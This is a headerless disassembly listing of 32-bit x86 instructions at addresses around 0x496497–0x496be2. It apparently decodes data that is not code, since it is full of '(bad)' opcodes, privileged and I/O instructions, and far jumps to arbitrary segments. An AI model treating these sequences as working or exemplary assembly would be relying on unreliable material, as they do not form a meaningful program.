  496497:	add    DWORD PTR [edi+0x1609aad6],0xffffff97
  49649e:	adc    BYTE PTR [eax-0x75],bl
  4964a1:	cwde   
  4964a2:	mov    edi,0x36ab0b3f
  4964a7:	push   ss
  4964a8:	pop    ds
  4964a9:	sub    al,0x58
  4964ab:	rol    BYTE PTR [edi+ecx*2],0xff
  4964af:	adc    BYTE PTR [eax+0x13],0x2c
  4964b3:	dec    edi
  4964b4:	push   DWORD PTR [ecx+ecx*2]
  4964b7:	rol    BYTE PTR [ecx+0x1b],cl
  4964ba:	inc    edi
  4964bb:	sbb    ebx,DWORD PTR [edx+0xd]
  4964be:	and    edi,esp
  4964c0:	mov    al,0xa2
  4964c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4964c3:	mov    al,0x43
  4964c5:	push   edi
  4964c6:	aam    0x5
  4964c8:	dec    ebp
  4964c9:	mov    al,0x4f
  4964cb:	xor    al,0xd4
  4964cd:	add    al,0xb
  4964cf:	pop    ds
  4964d0:	fisttp DWORD PTR [edi+0x25]
  4964d3:	inc    ebp
  4964d4:	adc    ch,BYTE PTR [esi]
  4964d6:	dec    esi
  4964d7:	scas   al,BYTE PTR es:[edi]
  4964d8:	xor    BYTE PTR [edx],bl
  4964da:	jmp    0x22d5:0x32dfa822
  4964e1:	mov    cl,0xad
  4964e3:	iret   
  4964e4:	dec    edi
  4964e5:	das    
  4964e6:	adc    al,0x6b
  4964e8:	bound  ecx,QWORD PTR [eax+0xf]
  4964eb:	inc    esp
  4964ec:	das    
  4964ed:	shr    dl,cl
  4964ef:	adc    al,BYTE PTR [ecx-0x533e5421]
  4964f5:	fst    QWORD PTR [edi+0x27]
  4964f8:	push   ss
  4964f9:	dec    edx
  4964fa:	pop    edx
  4964fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4964fc:	or     DWORD PTR [edi+0xf],eax
  4964ff:	xor    edx,DWORD PTR [ebx+0xfde9069]
  496505:	(bad)  
  496506:	xor    BYTE PTR [esi+0x4a],ch
  496509:	pop    edx
  49650a:	add    al,0x5f
  49650c:	adc    ebx,DWORD PTR [eax+0x5]
  49650f:	sub    eax,esp
  496511:	xchg   ebx,eax
  496512:	scas   eax,DWORD PTR es:[edi]
  496513:	fadd   DWORD PTR [ebx+0x6a]
  496516:	jmp    0x496537
  496518:	aaa    
  496519:	mov    eax,DWORD PTR [edi+0x3b632eac]
  49651f:	xor    ecx,DWORD PTR [edi-0x1]
  496522:	push   cs
  496523:	ret    
  496524:	pop    edx
  496525:	add    al,0xbf
  496527:	test   DWORD PTR [ebp+0x4],0xdf9736b1
  49652e:	test   BYTE PTR [eax],bh
  496530:	push   0x14e24761
  496535:	(bad)  
  496536:	sub    al,0xcf
  496538:	daa    
  496539:	(bad)  
  49653a:	stos   BYTE PTR es:[edi],al
  49653b:	pop    ebx
  49653c:	(bad)  
  49653d:	scas   eax,DWORD PTR es:[edi]
  49653e:	dec    edi
  49653f:	inc    esi
  496540:	add    DWORD PTR [ecx+0x624d9f10],eax
  496546:	or     eax,0x22370bb9
  49654b:	mov    dh,0xa0
  49654d:	shr    BYTE PTR [edi+0x47],1
  496550:	popa   
  496551:	and    eax,0x336ec017
  496556:	les    ebp,FWORD PTR [edx+0x6faf00d8]
  49655c:	xchg   esp,eax
  49655d:	mov    dh,BYTE PTR [ebp-0x40]
  496560:	xlat   BYTE PTR ds:[ebx]
  496561:	pop    ss
  496562:	aam    0x12
  496564:	push   es
  496565:	mov    eax,ds:0x148bffdf
  49656a:	pop    ecx
  49656b:	pop    es
  49656c:	aaa    
  49656d:	push   edi
  49656e:	(bad)  
  49656f:	fs in  al,0xb5
  496572:	or     BYTE PTR [edi+0x41],ch
  496575:	cmp    BYTE PTR [ebx+ebp*4],dl
  496578:	popa   
  496579:	nop
  49657a:	shr    bh,cl
  49657c:	aaa    
  49657d:	pop    edx
  49657e:	mov    ch,0x2
  496580:	dec    edx
  496581:	push   edi
  496582:	ja     0x496528
  496584:	es pop ecx
  496586:	xchg   edi,eax
  496587:	lahf   
  496588:	imul   DWORD PTR [ebp-0x74]
  49658b:	inc    ecx
  49658c:	push   0xda5742f7
  496591:	sub    dh,BYTE PTR [eax-0x6438805f]
  496597:	sbb    al,0xb3
  496599:	xor    edi,edi
  49659b:	inc    esi
  49659c:	mov    edi,0x5690d2aa
  4965a1:	scas   eax,DWORD PTR es:[edi]
  4965a2:	lods   al,BYTE PTR ss:[esi]
  4965a4:	mov    dl,dl
  4965a6:	out    dx,eax
  4965a7:	pop    es
  4965a8:	or     al,BYTE PTR [eax]
  4965aa:	in     al,dx
  4965ab:	xor    al,0x87
  4965ad:	sahf   
  4965ae:	xor    eax,DWORD PTR [esi+ebx*2]
  4965b1:	pop    edx
  4965b2:	inc    edx
  4965b3:	aaa    
  4965b4:	pop    ss
  4965b5:	add    BYTE PTR [edi-0x58801dae],dl
  4965bb:	or     ebx,DWORD PTR ds:0x43f711c0
  4965c1:	xlat   BYTE PTR ds:[ebx]
  4965c2:	xchg   ax,ax
  4965c4:	imul   esi,DWORD PTR [ebp+eax*4-0x2bf9c809],0x88ef9400
  4965cf:	pusha  
  4965d0:	arpl   bx,cx
  4965d2:	daa    
  4965d3:	(bad)  
  4965d5:	and    BYTE PTR ds:0x81178566,cl
  4965db:	add    DWORD PTR [ecx],0x61f8f07
  4965e1:	add    ecx,DWORD PTR [eax+0x10230705]
  4965e7:	sti    
  4965e8:	adc    bh,dh
  4965ea:	jg     0x496611
  4965ec:	dec    ecx
  4965ed:	or     ecx,DWORD PTR [ecx]
  4965ef:	sti    
  4965f0:	xchg   esi,eax
  4965f1:	adc    al,0x18
  4965f3:	push   esi
  4965f4:	outs   dx,DWORD PTR ds:[esi]
  4965f5:	(bad)  
  4965f6:	adc    DWORD PTR [ebp+0x346f155c],esi
  4965fc:	outs   dx,DWORD PTR ds:[esi]
  4965fd:	push   ecx
  4965fe:	lods   al,BYTE PTR ds:[esi]
  4965ff:	retf   
  496600:	pop    eax
  496601:	out    dx,eax
  496602:	pop    edi
  496603:	ret    
  496604:	ret    
  496605:	add    bl,BYTE PTR [ecx+eax*2]
  496608:	jmp    0x4965d1
  49660a:	xchg   DWORD PTR [ebp+ebp*4-0x38],eax
  49660e:	pop    edx
  49660f:	or     DWORD PTR [si-0x2a7a],ebp
  496614:	pop    ss
  496615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496616:	push   0xffffff96
  496618:	adc    ah,BYTE PTR [edi]
  49661a:	xchg   DWORD PTR [edi],ecx
  49661c:	pop    eax
  49661d:	push   eax
  49661e:	add    esp,eax
  496620:	iret   
  496621:	adc    eax,0x175b6a37
  496626:	into   
  496627:	inc    edi
  496628:	sbb    BYTE PTR [edx-0x4f],bl
  49662b:	arpl   WORD PTR [edi-0x39],bx
  49662e:	xchg   edi,eax
  49662f:	(bad)  
  496630:	cs push es
  496632:	out    0x43,eax
  496634:	aas    
  496635:	xchg   DWORD PTR [eax],edx
  496637:	mov    ds:0xf7fc1d4,al
  49663c:	push   ecx
  49663d:	dec    ebx
  49663e:	sbb    BYTE PTR [edi-0x7e5a0871],dl
  496644:	test   DWORD PTR [esi-0x6dbd1851],eax
  49664a:	xchg   esp,eax
  49664b:	loop   0x496653
  49664d:	(bad)  
  49664e:	ss adc cl,al
  496651:	add    eax,0x58c2432f
  496656:	jb     0x496664
  496658:	outs   dx,DWORD PTR ds:[esi]
  496659:	aaa    
  49665a:	rol    BYTE PTR [esi+0x63],0x75
  49665e:	(bad)  
  49665f:	jg     0x4966d2
  496661:	xchg   edi,eax
  496662:	dec    edx
  496663:	xchg   esp,eax
  496664:	dec    edi
  496665:	dec    edx
  496667:	je     0x496694
  496669:	lds    esp,FWORD PTR [ebx+esi*2+0x1956ea1f]
  496670:	outs   dx,BYTE PTR ds:[esi]
  496671:	and    esp,ebx
  496673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496674:	dec    ebp
  496675:	inc    ecx
  496676:	call   0x2558:0x368fcb49
  49667d:	imul   edx,DWORD PTR [ecx+0x37],0x434444df
  496684:	(bad)  
  496685:	out    0x47,eax
  496687:	and    DWORD PTR [ecx+0x3c],eax
  49668a:	popa   
  49668b:	pop    ss
  49668c:	mov    bh,0x26
  49668e:	pop    es
  49668f:	cmp    ebx,DWORD PTR [eax+0xf]
  496692:	(bad)  
  496693:	cmp    BYTE PTR [edx-0x7f],al
  496696:	sub    eax,0xb775700
  49669b:	or     edx,DWORD PTR [esi+0x45]
  49669e:	daa    
  49669f:	xchg   DWORD PTR [edx],edx
  4966a1:	mov    ds:0x372f75a4,eax
  4966a6:	and    DWORD PTR [ebx],ebx
  4966a8:	stos   DWORD PTR es:[edi],eax
  4966a9:	add    bl,BYTE PTR [edi]
  4966ab:	push   0xffffffc1
  4966ad:	lods   eax,DWORD PTR ds:[esi]
  4966ae:	rcr    DWORD PTR [edi-0x21],0x57
  4966b2:	sub    BYTE PTR [edx+ecx*2],ch
  4966b5:	addr16 aas 
  4966b7:	xor    eax,0x52532435
  4966bc:	scas   eax,DWORD PTR es:[edi]
  4966bd:	cmp    BYTE PTR [ebx],dh
  4966bf:	lods   al,BYTE PTR ds:[esi]
  4966c0:	or     al,ah
  4966c2:	cmp    dl,BYTE PTR [edi]
  4966c4:	xchg   DWORD PTR [ebx+0x1d],ebp
  4966c7:	sub    eax,DWORD PTR ds:0x4360afd7
  4966cd:	cmp    dh,BYTE PTR [esi]
  4966cf:	(bad)  
  4966d0:	scas   eax,DWORD PTR es:[edi]
  4966d1:	pop    es
  4966d2:	xor    ah,BYTE PTR [ecx]
  4966d4:	add    BYTE PTR [ebx+0x368f31cf],0x5a
  4966db:	fsub   st,st(1)
  4966dd:	adc    cl,BYTE PTR [edi+0x1f]
  4966e0:	add    al,0x64
  4966e2:	and    DWORD PTR [edx],eax
  4966e4:	das    
  4966e5:	aas    
  4966e6:	adc    DWORD PTR [edx],edx
  4966e8:	enter  0x1601,0x31
  4966ec:	xor    ebp,DWORD PTR [ebx-0x683f9d20]
  4966f2:	xor    BYTE PTR [edi],cl
  4966f4:	mov    ch,0x2
  4966f6:	inc    eax
  4966f7:	push   es
  4966f8:	imul   ebx,DWORD PTR [edi+0x4a],0x5c
  4966fc:	add    dh,BYTE PTR [ecx+0x47]
  4966ff:	pop    edi
  496700:	or     ebp,DWORD PTR [esi+ebp*1-0x772950e6]
  496707:	aad    0x68
  496709:	add    ebx,DWORD PTR [edi+0x5582b003]
  49670f:	jg     0x496740
  496711:	out    dx,eax
  496712:	shl    BYTE PTR [esi-0x304895f2],0x4d
  496719:	bt     ecx,ecx
  49671c:	dec    edi
  49671d:	xchg   DWORD PTR [edi+0x17],eax
  496720:	xchg   edx,eax
  496721:	pop    esp
  496722:	adc    DWORD PTR [edi+0x39],0x1418c2b7
  496729:	sbb    BYTE PTR [edi],cl
  49672b:	mov    al,ds:0xaf35a1a2
  496730:	mov    bh,0xc4
  496732:	popa   
  496733:	dec    ebp
  496734:	mov    ah,0x4b
  496736:	inc    ebp
  496737:	fisttp DWORD PTR [esi]
  496739:	jecxz  0x4966f3
  49673b:	test   al,0xd7
  49673d:	inc    edx
  49673e:	out    dx,eax
  49673f:	sub    al,BYTE PTR [ebx]
  496741:	mov    edx,0x4f3587d8
  496746:	enter  0x15b5,0x24
  49674a:	aas    
  49674b:	pop    ss
  49674c:	xor    eax,DWORD PTR [edx]
  49674e:	(bad)  
  49674f:	xor    eax,0x878f3f60
  496754:	and    cl,BYTE PTR [esi-0x6cc038fa]
  49675a:	adc    BYTE PTR [ecx],0x21
  49675d:	pop    ebp
  49675e:	out    dx,eax
  49675f:	imul   DWORD PTR [esi]
  496761:	jl     0x49678c
  496763:	inc    ecx
  496764:	aaa    
  496765:	outs   dx,DWORD PTR ds:[esi]
  496766:	jg     0x496784
  496768:	lea    eax,[eax]
  49676a:	mov    cl,0x47
  49676c:	inc    esp
  49676d:	add    DWORD PTR [ebx+0x522f8480],ecx
  496773:	mov    al,0xb6
  496775:	cmp    eax,0x57df1743
  49677a:	and    DWORD PTR [esi-0x28],ebp
  49677d:	fcom   DWORD PTR [edi]
  49677f:	outs   dx,DWORD PTR ds:[esi]
  496780:	mov    cl,0x18
  496782:	fs mov ebp,0x2237ff31
  496788:	add    ebp,DWORD PTR [ebx]
  49678a:	div    DWORD PTR es:[ebx]
  49678d:	push   es
  49678e:	xchg   esp,eax
  49678f:	adc    al,0x30
  496791:	neg    DWORD PTR [esp+ebp*4+0xa]
  496795:	or     edx,DWORD PTR [edi]
  496797:	outs   dx,DWORD PTR ds:[esi]
  496798:	ja     0x4967c8
  49679a:	es jmp 0x14eb:0x31bf7a2d
  4967a2:	mov    cl,0x45
  4967a4:	jg     0x496745
  4967a6:	xchg   ebp,eax
  4967a7:	add    eax,0x3f770b7d
  4967ac:	rcl    BYTE PTR [ecx],0x84
  4967af:	adc    BYTE PTR [ebx-0x6753c525],cl
  4967b5:	pop    ds
  4967b6:	xor    al,BYTE PTR [ecx+eax*4]
  4967b9:	dec    esi
  4967ba:	lods   al,BYTE PTR ds:[esi]
  4967bb:	xchg   DWORD PTR [edi+0x2f],edi
  4967be:	xor    dh,BYTE PTR [ecx-0x38cef3df]
  4967c4:	aaa    
  4967c5:	stos   BYTE PTR es:[edi],al
  4967c6:	or     dl,ah
  4967c8:	push   edx
  4967c9:	ds dec edi
  4967cb:	call   0xd28a:0x9fd88dc4
  4967d2:	mov    al,ds:0x7c77560
  4967d7:	bound  ecx,QWORD PTR [ebp-0x7d]
  4967da:	push   eax
  4967db:	fist   WORD PTR [edi+0x8]
  4967de:	loop   0x496808
  4967e0:	push   esp
  4967e1:	pop    ds
  4967e2:	das    
  4967e3:	sbb    cl,BYTE PTR ds:0xef479aac
  4967e9:	ret    0x6aa2
  4967ec:	add    al,0x1f
  4967ee:	js     0x496848
  4967f0:	pop    ebp
  4967f1:	imul   ebp,DWORD PTR [edi+0xf],0x6f
  4967f5:	sbb    ebx,DWORD PTR [eax+0x3f8a740a]
  4967fb:	aaa    
  4967fc:	and    cl,BYTE PTR [ebx]
  4967fe:	or     DWORD PTR [edx+0x67],ebp
  496801:	out    0x4a,eax
  496803:	int3   
  496804:	add    cl,BYTE PTR [esi-0x5aa7e8bb]
  49680a:	outs   dx,BYTE PTR ds:[esi]
  49680b:	or     eax,0x8d0f4ae7
  496810:	lds    ebx,FWORD PTR [edx-0x3b]
  496813:	inc    edi
  496814:	test   DWORD PTR [eax-0x38a97def],0xca75f2f7
  49681e:	inc    edx
  49681f:	push   edi
  496820:	xor    eax,0x45a83900
  496825:	and    al,BYTE PTR [edi+esi*8]
  496828:	mov    cl,0xa0
  49682a:	push   es
  49682b:	mov    al,0x77
  49682d:	lods   al,BYTE PTR ds:[esi]
  49682e:	inc    ecx
  49682f:	pop    es
  496830:	xor    edx,DWORD PTR [edi]
  496832:	aaa    
  496833:	neg    esi
  496835:	aam    0x89
  496837:	das    
  496838:	sub    ebp,DWORD PTR [edi+0x20485336]
  49683e:	pop    edi
  49683f:	test   DWORD PTR [edi+0x32],eax
  496842:	add    BYTE PTR [esi+0xa],al
  496845:	mov    bl,BYTE PTR [eax]
  496847:	test   BYTE PTR [edi+0x40716817],al
  49684d:	ret    0x1a7f
  496850:	pop    ebp
  496851:	shr    BYTE PTR [edx+0x6f],cl
  496854:	iret   
  496855:	sbb    esp,0xf7ffcd89
  49685b:	inc    ebx
  49685c:	inc    esi
  49685d:	add    bl,BYTE PTR [edx+0x30]
  496860:	xor    eax,0x40d2ef03
  496865:	sbb    al,0x2b
  496867:	fbstp  TBYTE PTR [eax]
  496869:	loop   0x4968bb
  49686b:	or     BYTE PTR [ecx],0x37
  49686e:	jb     0x6ff58f24
  496874:	pop    ebx
  496875:	xor    BYTE PTR [ebx+0xd],ah
  496878:	aas    
  496879:	(bad)
  49687d:	and    eax,0x1c8017a8
  496882:	sub    al,dl
  496884:	out    dx,eax
  496885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496886:	xor    eax,0xc26ad31a
  49688b:	xor    bl,BYTE PTR [edi]
  49688d:	fild   WORD PTR [eax]
  49688f:	stos   DWORD PTR es:[edi],eax
  496890:	push   0xffffff9d
  496892:	pop    ss
  496893:	ja     0x496845
  496895:	int3   
  496896:	mov    BYTE PTR [ebx+0x30473377],ah
  49689c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49689d:	sbb    cl,BYTE PTR [ecx]
  49689f:	or     BYTE PTR [edi+0x2e],dl
  4968a2:	cmp    BYTE PTR [eax+0x35],bl
  4968a5:	push   ss
  4968a6:	lds    ecx,FWORD PTR [edi]
  4968a8:	mov    bh,0xd1
  4968aa:	mov    al,0x46
  4968ac:	xchg   ebx,eax
  4968ad:	pop    ss
  4968ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4968af:	cmp    BYTE PTR [edx],ch
  4968b1:	ins    DWORD PTR es:[edi],dx
  4968b2:	and    bh,bl
  4968b4:	xor    al,BYTE PTR [ebp+0x31]
  4968b7:	sub    eax,0x50ef7f6c
  4968bc:	sub    eax,0xf742a700
  4968c1:	adc    BYTE PTR [ecx+0x5],ah
  4968c4:	xor    esi,0x7
  4968c7:	xlat   BYTE PTR ds:[ebx]
  4968c8:	or     BYTE PTR [ebx],ch
  4968ca:	js     0x49693a
  4968cc:	adc    ebx,DWORD PTR [edi-0x69]
  4968cf:	ror    BYTE PTR [edx+0x376768d6],0xa4
  4968d6:	xchg   ebp,eax
  4968d7:	xor    al,0x13
  4968d9:	push   cs
  4968da:	xor    al,0x38
  4968dc:	adc    al,0xaa
  4968de:	mov    ds:0x5ac8dfef,al
  4968e3:	mov    cl,0xb5
  4968e5:	ja     0x4968db
  4968e7:	inc    edx
  4968e8:	ror    BYTE PTR [edx+0x1c44ab2f],1
  4968ee:	ins    DWORD PTR es:[edi],dx
  4968ef:	int    0x86
  4968f1:	aas    
  4968f2:	aas    
  4968f3:	cmp    DWORD PTR [edx],ebx
  4968f5:	je     0x49691b
  4968f7:	xchg   DWORD PTR [ecx],esi
  4968f9:	inc    ebx
  4968fa:	pop    edi
  4968fb:	pop    ebp
  4968fc:	lds    esp,FWORD PTR [eax]
  4968fe:	xchg   ecx,eax
  4968ff:	addr16 xor al,0x82
  496902:	mov    esp,es
  496904:	adc    cx,WORD PTR [ebx+0x106adf37]
  49690b:	mov    al,0x2f
  49690d:	pop    edi
  49690e:	xor    ah,ah
  496910:	inc    eax
  496911:	add    al,0x26
  496913:	cmp    BYTE PTR ds:[edx],dh
  496916:	mov    BYTE PTR [ebp-0x4fe0bc69],dh
  49691c:	adc    BYTE PTR [edx+0x6a37bf23],dl
  496922:	inc    ecx
  496923:	out    dx,eax
  496924:	pusha  
  496925:	addr16 inc ebx
  496927:	div    DWORD PTR [edi]
  496929:	xor    BYTE PTR [edi+esi*4+0x5f3bdfb6],dh
  496930:	xor    al,0x8a
  496932:	sbb    ebp,DWORD PTR [ebp+0x38d7b745]
  496938:	outs   dx,DWORD PTR ds:[esi]
  496939:	fstp   TBYTE PTR [eax]
  49693b:	or     BYTE PTR [esi],ch
  49693d:	inc    ebx
  49693e:	xchg   DWORD PTR [ecx],esi
  496940:	ret    0x6288
  496943:	push   ebp
  496944:	xlat   BYTE PTR ds:[ebx]
  496945:	(bad)  
  496946:	adc    BYTE PTR [edi],al
  496948:	inc    eax
  496949:	cmp    al,0x7f
  49694b:	ss das 
  49694d:	add    al,0x17
  49694f:	(bad)
  496954:	lahf   
  496955:	and    eax,0xc65236c5
  49695a:	inc    esp
  49695b:	add    al,BYTE PTR [ebx+0x32e663e4]
  496961:	and    eax,0x1f0aad20
  496966:	outs   dx,DWORD PTR ds:[esi]
  496967:	xor    al,0x10
  496969:	sub    dl,BYTE PTR [esi-0x79]
  49696c:	mov    edx,DWORD PTR [edx-0x782073a8]
  496972:	aaa    
  496973:	test   DWORD PTR ds:0x41fef02,esi
  496979:	adc    eax,0xef56dc4d
  49697e:	sahf   
  49697f:	gs and al,0x8e
  496982:	push   DWORD PTR [edi]
  496984:	mov    cl,0x18
  496986:	adc    al,0xa
  496988:	pop    es
  496989:	das    
  49698a:	and    cl,cl
  49698c:	pop    ebp
  49698d:	mov    ds:0xa1a936b7,al
  496992:	lods   eax,DWORD PTR ds:[esi]
  496993:	call   0x310090ef
  496998:	aam    0xa
  49699a:	push   edx
  49699b:	mov    cl,0x97
  49699d:	inc    edi
  49699e:	stos   DWORD PTR es:[edi],eax
  49699f:	or     ch,BYTE PTR ds:0xff77755
  4969a5:	dec    edi
  4969a6:	mov    DWORD PTR [esi+0x19],eax
  4969a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4969aa:	ja     0x496959
  4969ac:	sub    BYTE PTR ds:0x84e7b718,dl
  4969b2:	or     BYTE PTR [eax+ebp*8-0x7f086089],dh
  4969b9:	add    DWORD PTR [edi+0x7396b01],ebp
  4969bf:	aam    0x92
  4969c1:	jmp    0x496a15
  4969c3:	xchg   edi,eax
  4969c4:	xor    al,0x84
  4969c6:	imul   edx,DWORD PTR [eax-0x5e],0xffffff97
  4969ca:	iret   
  4969cb:	xor    ebp,DWORD PTR [ebx+0x1b709b15]
  4969d1:	iret   
  4969d2:	addr16 (bad) 
  4969d4:	xchg   ebx,eax
  4969d5:	stos   DWORD PTR es:[edi],eax
  4969d6:	xor    DWORD PTR [esi+0x75388f67],ebp
  4969dc:	ins    BYTE PTR es:[edi],dx
  4969dd:	mov    eax,ds:0x272fcf0a
  4969e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4969e3:	and    al,BYTE PTR [eax]
  4969e5:	outs   dx,DWORD PTR ds:[esi]
  4969e6:	xchg   edi,eax
  4969e7:	xlat   BYTE PTR ds:[ebx]
  4969e8:	xchg   BYTE PTR ds:0xc7ef6811,al
  4969ee:	push   ss
  4969ef:	stos   DWORD PTR es:[edi],eax
  4969f0:	test   BYTE PTR es:[edi-0x32b7f642],al
  4969f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4969f8:	(bad)  
  4969f9:	mov    al,0xd3
  4969fb:	ret    0xcf88
  4969fe:	xchg   edi,eax
  4969ff:	mov    ds:0xa790eb19,al
  496a04:	mov    bh,0xad
  496a06:	xor    BYTE PTR [edx],dl
  496a08:	shr    DWORD PTR [edi],0x73
  496a0b:	add    al,0x2e
  496a0d:	or     BYTE PTR [ebp-0x21],al
  496a10:	inc    ebp
  496a11:	lea    eax,[ecx-0x78d053ba]
  496a17:	aaa    
  496a18:	mov    al,0x1
  496a1a:	pop    eax
  496a1b:	mov    ds:0x52062faf,eax
  496a20:	inc    eax
  496a21:	fmul   st(7),st
  496a23:	cmp    BYTE PTR [edi-0x3f53fbab],cl
  496a29:	test   DWORD PTR [edi+0x28],0x8f69a42c
  496a30:	das    
  496a31:	adc    eax,0xa3c6c156
  496a36:	aas    
  496a37:	leave  
  496a38:	xchg   ebp,eax
  496a39:	add    al,0x56
  496a3b:	addr16 xor al,0xbc
  496a3e:	das    
  496a3f:	and    al,0x8
  496a41:	movq   mm2,QWORD PTR [edi]
  496a44:	imul   ebx,edx,0x69
  496a47:	sbb    eax,0x887674b
  496a4c:	pop    ebp
  496a4d:	les    ecx,FWORD PTR [ecx]
  496a4f:	outs   dx,BYTE PTR ds:[esi]
  496a50:	ja     0x496a18
  496a52:	xchg   BYTE PTR [ebp+0x11],dl
  496a55:	nop    DWORD PTR [ebp-0x3054edf2]
  496a5c:	cmovp  ebp,DWORD PTR [edx+0x41df1470]
  496a63:	out    0x35,al
  496a65:	ror    BYTE PTR [edx],1
  496a67:	inc    ebp
  496a68:	(bad)  
  496a69:	pop    es
  496a6a:	mov    eax,fs
  496a6c:	(bad)  
  496a6d:	and    bl,BYTE PTR [ebx]
  496a6f:	dec    DWORD PTR [ebp+0x37410705]
  496a75:	lods   al,BYTE PTR cs:[esi]
  496a77:	arpl   cx,ax
  496a79:	pop    ss
  496a7a:	(bad)  
  496a7b:	xchg   edi,eax
  496a7c:	rcl    BYTE PTR [edx+0x13],cl
  496a7f:	mov    al,0x4f
  496a81:	fild   WORD PTR [esp+eax*4]
  496a84:	stos   BYTE PTR es:[edi],al
  496a85:	xor    eax,0x3060d746
  496a8a:	adc    ebx,DWORD PTR [edx-0x39]
  496a8d:	ja     0x496a9b
  496a8f:	jo     0x496a9d
  496a91:	add    bh,BYTE PTR [edi]
  496a93:	scas   eax,DWORD PTR es:[edi]
  496a94:	inc    esp
  496a95:	push   0x3b2471d1
  496a9a:	scas   eax,DWORD PTR es:[edi]
  496a9b:	push   ecx
  496a9c:	mov    al,ds:0xaf8b2ba6
  496aa1:	daa    
  496aa2:	xchg   ebp,eax
  496aa3:	aam    0x87
  496aa5:	dec    ebx
  496aa6:	xchg   edi,eax
  496aa7:	mov    edi,0x51c74167
  496aac:	pop    eax
  496aad:	jb     0x496a5e
  496aaf:	and    edx,DWORD PTR [eax-0x60]
  496ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496ab3:	scas   eax,DWORD PTR es:[edi]
  496ab4:	(bad)  
  496ab5:	sub    DWORD PTR [eax],esi
  496ab7:	cmp    al,0xb
  496ab9:	scas   eax,DWORD PTR es:[edi]
  496aba:	(bad)  
  496abb:	push   esi
  496abc:	inc    ecx
  496abd:	loopne 0x496a6c
  496abf:	iret   
  496ac0:	and    esp,edi
  496ac2:	sbb    BYTE PTR [ebx+0x17332b00],cl
  496ac8:	pop    eax
  496ac9:	pop    ebx
  496aca:	gs cmp al,0xf7
  496acd:	pop    es
  496ace:	das    
  496acf:	push   eax
  496ad0:	and    BYTE PTR [esp+ebx*1-0x47809851],bh
  496ad7:	loop   0x496a6f
  496ad9:	mov    eax,ds:0xbaba326f
  496ade:	inc    esp
  496adf:	ins    BYTE PTR es:[edi],dx
  496ae0:	sti    
  496ae1:	daa    
  496ae2:	inc    esp
  496ae3:	add    BYTE PTR [ebx],dl
  496ae5:	mov    DWORD PTR [edx+0x68611817],eax
  496aeb:	inc    ecx
  496aec:	out    0xcf,eax
  496aee:	adc    DWORD PTR ds:0xc172c48,eax
  496af4:	sbb    al,0x83
  496af6:	test   eax,0x6da834d7
  496afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496afc:	or     ah,BYTE PTR [edi]
  496afe:	test   ecx,0x67b0029d
  496b04:	inc    ebx
  496b05:	mov    ebx,0x433214a9
  496b0a:	or     edx,DWORD PTR ds:0xff4bab51
  496b10:	cmovne eax,DWORD PTR [eax]
  496b13:	or     ecx,DWORD PTR [edi+edi*1-0x292f5ca8]
  496b1a:	jg     0x98647946
  496b20:	mov    DWORD PTR es:[ebp-0x79],0x8408082e
  496b28:	daa    
  496b29:	xor    ah,BYTE PTR [ecx+0x4c]
  496b2c:	or     al,0xab
  496b2e:	scas   eax,DWORD PTR es:[edi]
  496b2f:	getsec 
  496b31:	lods   al,BYTE PTR ds:[esi]
  496b32:	add    al,bl
  496b34:	pop    eax
  496b35:	push   DWORD PTR [edi+0x10725ac9]
  496b3b:	dec    edi
  496b3c:	inc    ecx
  496b3d:	ror    BYTE PTR [edx],cl
  496b3f:	arpl   WORD PTR [ecx],si
  496b41:	daa    
  496b42:	or     eax,DWORD PTR [esi+0x42]
  496b45:	mov    esi,0x46d7c1
  496b4a:	xor    BYTE PTR [ebx+ebx*1+0x5f671830],ah
  496b51:	xor    al,0xd5
  496b53:	and    BYTE PTR [edx],dl
  496b55:	stos   DWORD PTR es:[edi],eax
  496b56:	outs   dx,DWORD PTR ds:[esi]
  496b57:	xchg   edx,eax
  496b58:	xor    al,0x98
  496b5a:	lods   al,BYTE PTR ds:[esi]
  496b5b:	pop    es
  496b5c:	ror    BYTE PTR ds:0x31d76e1a,0x5f
  496b63:	jb     0x496af9
  496b65:	mov    cl,BYTE PTR [eax+0x6c]
  496b68:	fist   WORD PTR [edi]
  496b6a:	sahf   
  496b6b:	ret    
  496b6c:	call   0x5fd8ab17
  496b71:	mov    cl,BYTE PTR [eax-0x24]
  496b74:	or     cl,bh
  496b76:	inc    esi
  496b77:	jg     0x496b23
  496b79:	je     0x496bbf
  496b7b:	ret    
  496b7c:	pop    edi
  496b7d:	aaa    
  496b7e:	test   DWORD PTR ds:0x9fc29289,0x8d8a2687
  496b88:	or     BYTE PTR [edi-0x61],ch
  496b8b:	xor    DWORD PTR [eax+0x67c1c85a],ecx
  496b91:	xor    al,0x58
  496b93:	shl    DWORD PTR [edx-0x46],0xbf
  496b97:	xor    DWORD PTR [edi-0x1f90a2f9],edi
  496b9d:	clc    
  496b9e:	and    ebx,DWORD PTR [edi]
  496ba0:	aaa    
  496ba1:	daa    
  496ba2:	mov    edi,0xbc9604fb
  496ba7:	sahf   
  496ba8:	inc    ebp
  496ba9:	sub    ebx,DWORD PTR [edi]
  496bab:	adc    BYTE PTR [ebx+0x701f4a43],cl
  496bb1:	mov    al,0x68
  496bb3:	push   ecx
  496bb4:	addr16 xchg edi,eax
  496bb6:	jb     0x683a760c
  496bbc:	xlat   BYTE PTR ds:[ebx]
  496bbd:	sub    al,0x4a
  496bbf:	add    BYTE PTR [ebx+0x558d6f87],cl
  496bc5:	add    eax,0x202adf68
  496bca:	pop    esp
  496bcb:	add    DWORD PTR [edi],esi
  496bcd:	inc    ecx
  496bce:	outs   dx,DWORD PTR ds:[esi]
  496bcf:	cmp    cl,BYTE PTR [ecx+0x3f3fb055]
  496bd5:	lods   eax,DWORD PTR ds:[esi]
  496bd6:	arpl   WORD PTR ds:0x381f47c6,ax
  496bdc:	or     DWORD PTR [eax-0xe],esp
  496bdf:	out    0x34,eax
  496be1:	(bad)  
  496be2:	push   ds
